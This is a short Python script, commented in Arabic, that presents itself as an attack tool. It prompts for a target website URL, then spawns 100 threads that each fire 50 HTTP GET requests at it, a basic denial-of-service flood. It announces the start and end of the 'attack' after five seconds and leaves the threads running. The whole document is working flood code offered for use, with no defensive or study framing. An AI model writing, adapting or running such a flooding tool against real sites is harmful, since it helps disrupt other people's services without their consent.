import requests
import threading
import time

def attack(url, num_requests):
    for _ in range(num_requests):
        try:
            requests.get(url, timeout=5)
        except:
            pass

def main():
    url = input("أدخل URL الموقع (مثال: http://example.com): ")
    threads = 100  # عدد الثريدات
    requests_per_thread = 50  # عدد الطلبات لكل ثريد
    duration = 5  # مدة الهجوم بالثواني
    
    print(f"بدء الهجوم على {url} لمدة {duration} ثواني...")
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack, args=(url, requests_per_thread))
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    print("الهجوم انتهى.")
    
    # لا ننتظر انتهاء جميع الثريدات لأننا نريد التوقف بعد المدة المحددة

if __name__ == "__main__":
    main()